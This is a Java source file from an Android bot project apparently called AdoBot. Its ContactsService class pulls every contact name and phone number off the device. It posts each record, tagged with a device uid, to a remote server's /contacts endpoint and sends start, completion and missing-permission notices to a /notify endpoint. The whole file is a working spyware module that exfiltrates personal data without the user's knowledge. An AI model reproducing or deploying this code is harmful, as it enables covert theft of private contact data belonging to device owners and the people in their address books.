package com.android.adobot;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.util.HashMap;

import http.Http;
import http.HttpRequest;

/**
 * Created by adones on 2/24/17.
 */

public class ContactsService extends BaseService {
    private static final String TAG = "ContactsService";
    private CommonParams commonParams;
    private final String[] pers = {Manifest.permission.READ_CONTACTS};

    public ContactsService(Client c) {
        setContext(c);
        this.commonParams = new CommonParams(c);
    }

    @Override
    public void run() {
        super.run();
        Log.i(TAG, "Running!!!!");
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            getContactsList();
        } else {

            HashMap contactP = new HashMap();
            contactP.put("event", "nopermission");
            contactP.put("permission", Manifest.permission.READ_CONTACTS);
            contactP.put("uid", commonParams.getUid());

            Http req = new Http();
            req.setUrl(commonParams.getServer() + "/notify");
            req.setMethod(HttpRequest.METHOD_POST);
            req.setParams(contactP);
            req.execute();

            requestPermissions();
        }
    }

    private void getContactsList() {

        HashMap startHm = new HashMap();
        startHm.put("event", "getcontacts:started");
        startHm.put("uid", commonParams.getUid());
        startHm.put("device", commonParams.getDevice());

        Http startReq = new Http();
        startReq.setUrl(commonParams.getServer() + "/notify");
        startReq.setMethod(HttpRequest.METHOD_POST);
        startReq.setParams(startHm);
        startReq.execute();

        ContentResolver cr = context.getApplicationContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {

                String id;
                String name;
                String phoneNumbers = "";

                id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String pn = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        if (pCur.isFirst())
                            phoneNumbers += pn;
                        else
                            phoneNumbers += ", " + pn;


                    }
                    pCur.close();
                }

                HashMap contactP = new HashMap();
                contactP.put("uid", commonParams.getUid());
                contactP.put("contact_id", id);
                contactP.put("name", name);
                contactP.put("phone_numbers", phoneNumbers);

                Http req = new Http();
                req.setUrl(commonParams.getServer() + "/contacts");
                req.setMethod(HttpRequest.METHOD_POST);
                req.setParams(contactP);
                req.execute();

            }
        }

        HashMap endHm = new HashMap();
        endHm.put("event", "getcontacts:completed");
        endHm.put("uid", commonParams.getUid());
        endHm.put("device", commonParams.getDevice());

        Http endReq = new Http();
        endReq.setUrl(commonParams.getServer() + "/notify");
        endReq.setMethod(HttpRequest.METHOD_POST);
        endReq.setParams(endHm);
        endReq.execute();


        cur.close();
    }

}
